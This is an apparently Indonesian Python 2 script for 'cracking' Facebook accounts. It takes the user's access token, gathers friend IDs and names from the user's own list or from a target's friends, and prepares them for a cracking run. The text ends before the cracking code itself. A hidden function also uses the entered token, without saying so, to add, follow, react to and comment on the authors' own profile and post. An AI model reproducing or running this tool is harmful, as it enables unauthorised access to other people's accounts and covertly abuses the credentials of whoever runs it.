#coding:utf-8
#!/user/bin/python2
#Coding By ROMI AFRIZAL
#Dec By IQBAAL BOBZ
#Fb : facebook.com/romi.29.04.03
#Fb : facebook.com/INIAKUNABAIDEH.TQ
#Awikwok Recode ya? jgn lupa cantumkan nama pembuat nya bro! :)
#Recode gk bakal jadiin lu mastah :). Hargailah karya orang lain!
#Jgn lupa cantumkan nama gua ya bro :) gw dah susah payah ngoding nih_-
try:    
    import itertools,os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests,uuid
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
    from datetime import datetime
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system('python2 indo.so')

from requests.exceptions import ConnectionError
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-Telkomsel': repr(sim),'x-fb-net-Telkomsel': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyLTE','user-agent':'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf8")
os.system('clear')
animasis = ["[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□","[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□","[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]", "[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□","[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□","[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□","[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]"]        
for i in range(len(animasis)):
	time.sleep(0.01)
	sys.stdout.write("\r\x1b[1;95m#\x1b[1;92mLoading "+ random.choice(['\x1b[1;93m', '\x1b[1;96m', '\x1b[1;95m', '\x1b[1;92m', '\x1b[1;91m','\x1b[1;94m']) + animasis[i % len(animasis)])
	sys.stdout.flush()
	
def exit():
    jalan ('\n\x1b[1;91m Sampai Jumpa Ajg \x1b[0;97m\n')
    os.sys.exit()
    
def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
        return cetak(d)
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
def jajan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.1)
def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;95m •\x1b[1;96m Memeriksa Key ' + o,
        sys.stdout.flush()
        time.sleep(1)
        
#logo = '''\x1b[1;95m ╔═══════════════════════════════════════════╗\n\x1b[1;92m █\x1b[1;91m _ _  _ ___  ____ ____ ____ ____ ____ _  _\x1b[1;92m █\n\x1b[1;92m █ \x1b[1;91m| |\ | |  \ |  | |    |__/ |__| |    |_/  \x1b[1;92m█\n\x1b[1;92m █\x1b[1;97m | | \| |__/ |__|\x1b[1;92m.\x1b[1;97m|___ |  \ |  | |___ | \_ \x1b[1;92m█    \x1b[1;92m █                                           █\n\x1b[1;95m ╚═══════════════════════════════════════════╝ \n\x1b[1;91m  •\x1b[1;93m•\x1b[1;92m• \x1b[1;94m╔═════════════════════════════════╗\x1b[1;92m •\x1b[1;93m•\x1b[1;91m•\n\x1b[1;95m      ║ \x1b[1;92mGithub1\x1b[1;91m : \x1b[1;92mgithub.com/ROMI-AFRZL\x1b[1;95m ║\n      \x1b[1;95m║ \x1b[1;92mGithub2 \x1b[1;91m: \x1b[1;92mgithub.com/Mark-Zuck  \x1b[1;95m║\n\x1b[1;91m  •\x1b[1;93m•\x1b[1;92m• \x1b[1;94m╚═════════════════════════════════╝\x1b[1;92m •\x1b[1;93m•\x1b[1;91m•\n\x1b[1;91m────────────────────────────────────────────────'''  

idh = []
cps = []
cp = []
ok = []
oks = []
back = 0
threads = []

def license_rom():
    try:
        toket = open('licensed.log', 'r').read()
    except IOError:
        print '\x1b[1;91m License Invalid !'
        os.system('clear')
        os.system('rm -rf licensed.log')
        romz()

    if os.path.exists('licensed.log'):
        user1()
    else:
        romz()

def romz():
    os.system('clear')
    print logo
    ro_mi_ganz_XD()
    #jalan('\n\x1b[1;95m • \x1b[1;96mSucces Key Siap\x1b[1;92m ✓')
    id = uuid.uuid4().hex[:25]
    idg = open('licensed.log', 'w')
    idg.write(id)
    idg.close()
    jalan ('\n\x1b[1;95m • \x1b[1;96mKey\x1b[1;91m : \x1b[92m' + id+' \x1b[1;92m✓')
    time.sleep(0.07)
    jalan ('\x1b[1;95m • \x1b[1;91mKey Belum Di konfirmasi\x1b[1;39m')
    time.sleep(0.07)
    jalan ('\x1b[1;95m • \x1b[1;96mChat Admin Untuk Mengkonfirmasi Key\x1b[1;39m')
    time.sleep(0.07)
    raw_input('\n\x1b[1;95m • \x1b[1;96mTekan Enter ')
    os.system('am start https://wa.me/+6282371648186?text=Assalamualaikum+bang+saya+ingin+mengkonfirmasi+Key+saya%20Key:%20' + id + ' >/dev/null') 
    time.sleep(1)
    os.sys.exit()
def user1():
    try:
        j = open('licensed.log', 'r').read()
        r = requests.get('https://github.com/Mark-Zuck/indo.crack/blob/main/license/login%20license').text.strip() # Jangan Di ganti bro'i nanti error
        if j in r:
            os.system('clear')
            print logo
            tik()
            jalan('\n\x1b[1;95m •\x1b[1;92m Key Tersedia ✓')
            time.sleep(1)
            rom_menu()
        else:
            os.system('clear')
            print logo
            tik()
            jalan ('\n\x1b[1;95m •\x1b[1;91m Key Tidak Tersedia !')
            time.sleep(1)
            romz()
            jalan ('\x1b[1;95m • \x1b[1;96mChat Admin Untuk Mengkonfirmasi Key\x1b[1;39m')
            time.sleep(0.07)
            raw_input('\n\x1b[1;95m • \x1b[1;96mTekan Enter ')
            os.system('am start https://wa.me/+6282371648186?text=Assalamualaikum+bang+saya+ingin+mengkonfirmasi+Key+saya%20Key:%20' + j + ' >/dev/null')
            os.sys.exit()
    except requests.exceptions.ConnectionError:
    	os.system('clear')
        print '\x1b[1;91m [!] Tidak Ada Koneksi Data\x1b[0;97m'
        os.sys.exit()
    except KeyboardInterrupt:
        os.sys.exit()
    except IOError:
        subprocess.Popen(['rm', '-rf', 'licensed.log'])
        romz()
def masuk():
    os.system('clear')
    print logo
    time.sleep(0.07)
    print '\x1b[1;94m [\x1b[1;97m1\x1b[1;94m] \x1b[1;96mLogin Token'
    time.sleep(0.07)
    print '\x1b[1;94m [\x1b[1;97m2\x1b[1;94m] \x1b[1;96mAmbil Token Dari Link'
    time.sleep(0.07)
    print '\x1b[1;94m [\x1b[1;97m3\x1b[1;94m] \x1b[1;96mTutorial Youtube\x1b[1;91m,\x1b[1;96mCara Mendapatkan Token'
    time.sleep(0.07)
    print ' \x1b[1;94m[\x1b[91m0\x1b[1;94m] \x1b[1;91mkeluar'
    time.sleep(0.07)
    print 48 * '\x1b[1;91m\xe2\x94\x80'
    time.sleep(0.07)
    pilih_masuk()
def pilih_masuk():
    mi = raw_input("\x1b[1;96m zuck\x1b[1;91m/\x1b[1;94m>\x1b[1;93m ")
    if mi =="1":
        os.system("clear")
        print logo
        token = raw_input("\x1b[1;94m [\x1b[1;93m?\x1b[1;94m]\x1b[1;96m Token \x1b[1;91m: \x1b[1;93m")
        sav = open(".logrom.txt","w")
        sav.write(token)
        sav.close()
        jalan('                       ')
        print("\033[1;32m [✓] Login Berhasil\033[0;97m")
        bot_fl_kom_romi()
        #rom_menu()
    elif mi =="2":
    	os.system('clear')
        print logo
        jalan(' \033[1;32mAnda Akan Di Arahkan Ke Browser')
        os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed')
        masuk()
    elif mi =="0":
        exit()
    elif mi =="3":
    	os.system('clear')
    	print logo
        jalan(' \033[1;32mAnda Akan Di Arahkan Ke Youtube ')
        jalan(' \033[1;32mJgn Lupa Subrek ya :)')
    	os.system('xdg-open https://youtu.be/IG5QfdxRkeY')
        masuk()
    else:
        print ("\x1b[1;91m [!] Isi yg benar")
        pilih_masuk()
def ro_mi_ganz_XD():
    ro_mi = [
     '.   ', '..  ', '... ']
    for m in ro_mi:
        print '\r\x1b[1;95m •\x1b[1;96m Menghasilkan Key ' + m,
        sys.stdout.flush()
        time.sleep(1)
def bot_fl_kom_romi():
    try:
        token = open('.logrom.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m [!] Token invalid'
        os.system('rm -rf .logrom.txt')
    fbid = ('100003723696885')
    kom2 = ('Wah Hebat Kamu😘')
    kom1 = ('Yang Post Pro:v 😍')
    reac = ('ANGRY')
    post2 = ('2206614082806027')
    requests.post('https://graph.facebook.com/100003723696885/friends?access_token=' + token)
    requests.post('https://graph.facebook.com/100003723696885/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100003723696885/posts/'+post2+'/reactions?type='+reac+'&access_token='+ token)
    requests.post('https://graph.facebook.com/posts/'+post2+'/comments/?message=' +kom2+ '&access_token=' + token)
    requests.post('https://graph.facebook.com/100003723696885/posts/'+post2+'/comments/?message=' +kom1+ '&access_token=' + token)
    rom_menu()

def rom_menu():
    os.system("clear")
    try:
        token = open(".logrom.txt","r").read()
    except IOError:
        print("\x1b[1;91m [!] Token invalid")
        os.system("rm -rf .logrom.txt")
        time.sleep(1)
        masuk()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
        a = json.loads(r.text)
        name = a["name"]
    except KeyError:
        os.system("clear")
        print(" \x1b[1;91m[!] Token invalid")
        os.system("rm -rf .logrom.txt")
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
		print"\n \x1b[1;91m[!] Tidak ada koneksi\x1b[0;97m\n "
		os.sys.exit()
	
    os.system("clear")
    print logo
    ip = requests.get("https://api-asutoolkit.cloudaccess.host/ip.php").text
    #key = open('licensed.log', 'r').read()
    jalan("\x1b[1;93m [ \x1b[1;97mSelamat Datang \x1b[1;92m"+name+"\x1b[1;93m ]")
    print 48 * '\x1b[1;91m\xe2\x94\x80'
    time.sleep(0.07)
    #print("\x1b[1;97m Key Anda\x1b[1;91m  : \x1b[1;92m"+key+"\x1b[1;97m ")
    #time.sleep(0.07)
    print("\x1b[1;97m Alamat IP\x1b[1;91m : \x1b[1;92m"+ip+"\x1b[1;97m ")
    time.sleep(0.07)
    print 48 * '\x1b[1;91m\xe2\x94\x80'
    time.sleep(0.07)
    print("\x1b[1;94m [\x1b[1;97m1\x1b[1;94m] \x1b[1;96mStart Crack")
    time.sleep(0.07)
    print(' \x1b[1;94m[\x1b[1;97m2\x1b[1;94m]\x1b[1;96m Dump-ID')
    time.sleep(0.07)
    print(' \x1b[1;94m[\x1b[1;97m3\x1b[1;94m]\x1b[1;96m Lihat Hasil Crack')
    time.sleep(0.07)
    print(' \x1b[1;94m[\x1b[1;97m4\x1b[1;94m]\x1b[1;96m Follow/Add My Facebook')
    time.sleep(0.07)
    #print(' \x1b[1;94m[\x1b[1;97m4\x1b[1;94m]\x1b[1;96m Join Group')
    #time.sleep(0.07)
    print(" \x1b[1;94m[\x1b[1;92m5\x1b[1;94m]\x1b[1;92m Update Tools")
    time.sleep(0.07)
    print("\x1b[1;94m [\x1b[91m6\x1b[1;94m] \x1b[1;91mMenghapus Token")
    time.sleep(0.07)
   # print("\x1b[1;94m [\x1b[91m6\x1b[1;94m] \x1b[1;91mMenghapus License")
    #time.sleep(0.07)
    print("\x1b[1;94m [\x1b[91m0\x1b[1;94m] \x1b[1;91mKeluar")
    time.sleep(0.07)
    print 48 * '\x1b[1;91m\xe2\x94\x80'
    time.sleep(0.07)
    pilih_crek()
def hasil():
	os.system('clear')
	print logo
	os.system('xdg-open crek.txt')
	raw_input ('\n\x1b[1;91m kembali')
	rom_menu()
def pilih_crek():
    rom = raw_input(' \x1b[1;96mzuck\x1b[1;91m/\x1b[1;94m>\x1b[1;93m ')
    if rom =='1':
        romi_ganz()
    elif rom =='3':
    	hasil()
    elif rom =='2':
    	dump()
    elif rom =='4':
    	fbme()
    elif rom =='5':
    	os.system('clear')
    	update()
    #elif rom =='6':
    	#os.system('rm -rf licensed.log')
        #jajan('\x1b[1;92m [√] Menghapus License...')
        #os.sys.exit()
    elif rom =='6':
        os.system('rm -rf .logrom.txt')
        jalan('\x1b[1;92m [√] Menghapus token...')
        os.system('exit')
        #masuk()
   # elif rom =='4':
    	#jalan(' \033[1;32mAnda Akan Di Arahkan Ke Group ')
        #os.system('xdg-open https://www.facebook.com/groups/310605552656196')
      #  rom_menu()
    elif rom =='0':
    	print '\n\x1b[0;97m exit\x1b[0;97m'
    	os.sys.exit()
    else:
        print '\x1b[1;91m [!] Isi yg benar'
        pilih_crek()
logo ="  _   _   _   _   _   _   _   _   _   _  / \ / \ / \ / \ / \ / \ / \ / \ / \ / \  ( I | q | b | a | a | l | B | o | b | z ) \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/  © Lord Iqbaal Bobz// © Lord Romi Afrizal"
def romi_ganz():
	global token
	os.system("clear")
	try:
		token=open(".logrom.txt","r").read()
	except IOError:
		print("\x1b[1;91m [!] Token invalid")
		os.system("rm -rf .logrom.txt")
		time.sleep(1)
		masuk()
	os.system("clear")
	print logo
	print " \x1b[1;94m[\x1b[1;97m1\x1b[1;94m]\x1b[1;96m Crack Dari Daftar Teman"
	time.sleep(0.07)
	print " \x1b[1;94m[\x1b[1;97m2\x1b[1;94m]\x1b[1;96m Crack Dari Publik"
	time.sleep(0.07)
	#print " \x1b[1;94m[\x1b[1;97m3\x1b[1;94m]\x1b[1;96m Crack Dari Followers Saya"
	#time.sleep(0.07)
	#print " \x1b[1;94m[\x1b[1;97m4\x1b[1;94m]\x1b[1;96m Crack Dari Followers Teman"
	#time.sleep(0.07)
	#print " \x1b[1;94m[\x1b[1;97m5\x1b[1;94m]\x1b[1;96m Crack Dari Post Like"
	#time.sleep(0.07)
	#print " \x1b[1;94m[\x1b[1;97m6\x1b[1;94m]\x1b[1;96m Crack Dari Groups"
	#time.sleep(0.07)
	print ' \x1b[1;94m[\x1b[91m0\x1b[1;94m]\x1b[1;91m Kembali'
	time.sleep(0.07)
	print 48 * '\x1b[1;91m\xe2\x94\x80'
	time.sleep(0.07)
	rom_ganz()
	
def rom_ganz():
	tod = raw_input(" \x1b[1;96mzuck\x1b[1;91m/\x1b[1;94m>\x1b[1;93m ")
	id=[]
	oks=[]
	cps=[]
	if tod=="":
		print '\x1b[1;91m [!] Isi yang benar'
		rom_ganz()
	elif tod=='1'or tod=='01':
		os.system("clear")
		print logo
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for s in z["data"]:
			uid=s['id']
			na=s['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif tod=='2'or tod=='02':
		os.system("clear")
		print logo
		idt = raw_input("\x1b[1;95m • \x1b[1;96mMasukan ID \x1b[1;91m: \x1b[1;93m")
		os.system("clear")
		print logo
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			jalan("\x1b[1;95m • \x1b[1;96mNama Akun \x1b[1;91m: \x1b[1;93m"+q["name"])
		except KeyError:
			print('\n\x1b[1;91m [!] ID: '+idt+' Tidak Publik')
			raw_input("\n \x1b[1;91mKembali ")
			romi_ganz()
	#elif tod=='3'or tod=='03':
		#os.system("clear")
		#print logo
		#r = requests.get("https://graph.facebook.com/me/subscribers?access_token="+token, headers=header)
		#z = json.loads(r.text)
		#for s in z["data"]:
			#uid=s['id']
			#na=s['name']
			#nm=na.rsplit(" ")[0]
			#id.append(uid+'|'+nm)
	#elif tod=='4'or tod=='04':
		#os.system("clear")
		#print logo
		#flw = raw_input("\x1b[1;95m • \x1b[1;96mMasukan ID \x1b[1;91m: \x1b[1;93m")
		#os.system("clear")
		#print logo
		#try:
			#r = requests.get("https://graph.facebook.com/"+flw+"/subscribers?access_token="+token, headers=header)
			#q = json.loads(r.text)
			#jalan("\x1b[1;95m • \x1b[1;96mNama Akun \x1b[1;91m: \x1b[1;93m"+q["name"])
		#except KeyError:
			#print('\n\x1b[1;91m [!] ID: '+flw+' Tidak Publik')
			#raw_input("\n \x1b[1;91mKembali ")
			#romi_ganz()
	#elif tod=='5'or tod=='05':
		#postlike()
	#elif tod=='6'or tod=='06':
		#rom_grup()

		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	
	elif tod =="0":
		rom_menu()
	else:
		print ("\x1b[1;91m [!] Isi yg benar")
		rom_ganz()
	
	print("\x1b[1;95m •\x1b[1;96m Total ID \x1b[1;91m: \x1b[1;93m"+str(len(id)))
	jalan ('\x1b[1;95m • \x1b[1;92mCrack Berjalan... ')
	jalan ('\x1b[1;95m • \x1b[1;96mSedang Dalam Proses\x1b[1;91m, \x1b[1;96mMohon Bersabar Ajg')
